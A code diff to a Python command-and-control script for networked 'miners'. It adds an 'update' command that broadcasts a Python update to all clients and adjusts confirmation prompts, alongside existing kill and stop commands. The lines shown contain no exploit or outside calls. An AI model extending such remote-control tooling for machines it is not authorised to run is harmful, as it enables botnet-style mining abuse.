@@ -42,7 +42,7 @@ def update_clients():
 
 
 def server_command_control():
-    valid_commands = ["start", "start_opts", "stop", "kill", "help", "exit"]
+    valid_commands = ["start", "start_opts", "stop", "kill", "update", "help", "exit"]
 
     first_loop = True
 
@@ -61,6 +61,7 @@ def server_command_control():
                 "ping - Query which miners are on the network and available for commands"
             )
             print("kill - Kills execution on all available clients (very abruptly)")
+            print("update - update python on all clients")
             print("help - This message")
             print("exit - Exit the C2 (clients are unaffected)")
 
@@ -80,7 +81,14 @@ def server_command_control():
 
         elif command == "kill":
             if (
-                input("Are you sure you want to kill all clients? (y/N): ").lower()
+                input("Kill all clients? (y/N): ").lower()
+                == "y"
+            ):
+                server_send_broadcast(command)
+
+        elif command == "update":
+            if (
+                input("Update all clients? (y/N): ").lower()
                 == "y"
             ):
                 server_send_broadcast(command)
